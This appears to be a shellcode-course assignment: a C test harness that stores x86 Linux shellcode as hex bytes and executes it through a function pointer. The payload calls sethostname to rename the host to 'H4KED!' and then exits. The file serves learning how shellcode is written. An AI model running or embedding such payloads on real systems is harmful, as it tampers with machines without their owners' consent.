/* Filename: sethostname.c
 Author: Eric Van Zutphen
 SLAE Assignment 6
 SLAE ID: SLAE - 1140 */
#include <stdio.h>
#include <string.h>

unsigned char shellcode[] =

"\xeb\x11\x31\xc0\xb0\x4a\x5b\xb1\x08\xcd\x80\x31\xc0\xb0\x01\x31\xdb\xcd\x80\xe8\xea\xff\xff\xff\x48\x34\x4b\x45\x44\x21\x0a\x21";

int main()
{
        printf("Shellcode Length:  %d
", strlen(shellcode));

        int (*ret)() = (int(*)())shellcode;

        ret();
}